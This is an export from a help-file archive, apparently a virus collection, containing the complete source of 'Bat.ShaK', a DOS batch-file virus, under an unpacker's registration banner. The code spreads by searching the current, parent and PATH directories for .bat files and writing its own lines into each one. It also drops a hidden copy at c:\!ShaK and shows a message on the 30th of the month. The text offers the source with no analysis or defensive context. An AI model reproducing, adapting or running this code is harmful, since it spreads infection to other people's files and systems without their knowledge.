================================================================================
<br>This file has been exported by unregistered version of CHMUnpacker.
<br>This message is not appear on files exported by a registered version of CHMUnpacker.
<br>You can buy CHMUnpacker at <a href="http://www.bobsoft.com/chmu">http://www.bobsoft.com/chmu</a>
<br>================================================================================
<br>
<br>
<br>
<br>Bat.ShaK by ?


@goto the_virus
:host_program
:: host would go here

:: --- ShaK -----------
:: The ShaK Batch Virus
:: --- ShaK -----------
@if not '%_ShaK%==' goto ShaK_end
:the_virus ShaK
@if not '%_ShaK%==' goto host_program ShaK
@if '%0==' echo ShaK I'm Trapped - oh no
@if '%0==' goto host_program ShaK
@echo off>nul.ShaK
if '%1=='ShaK goto ShaK_%2
set ShaK=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %0 ShaK rh
set _ShaK=
set ShaK=
%comspec% /e:5000 /c %0 ShaK vir . .. %path%
goto ShaK_end
:ShaK_rh
set _ShaK=uh
%0 %ShaK%
:ShaK_vir
set ShaK=%0
if exist c:\!shak goto ShaK_ser
if exist %0.bat set ShaK=%0.bat
if not exist %ShaK% exit
find "ShaK"<%ShaK%>c:\!ShaK
attrib c:\!ShaK +h
:ShaK_ser
shift%_ShaK%
if '%2==' exit ShaK
for %%a in (%2\*.bat) do call %ShaK% ShaK inf %%a
goto ShaK_ser
:ShaK_inf
find "ShaK"<%3>nul
if not errorlevel 1 goto ShaK_cnt
echo @goto the_virus>c:\ShaK!
echo :host_program>>c:\ShaK!
type %3>>c:\ShaK!
echo.>>c:\ShaK!
type c:\!ShaK>>c:\ShaK!
move c:\ShaK! %3>nul
exit ShaK
:ShaK_cnt
set ShaKcnt=%ShaKcnt%1
if %ShaKcnt%==1111111111111111 exit
if not %ShaKcnt%==111 goto ShaK_end
echo.|date|find "30">nul.ShaK
if errorlevel 1 goto ShaK_end
echo *** ShaK.Bat.Virus Installed ***
echo Keep me around for your friends!%_ShaK%
:ShaK_end
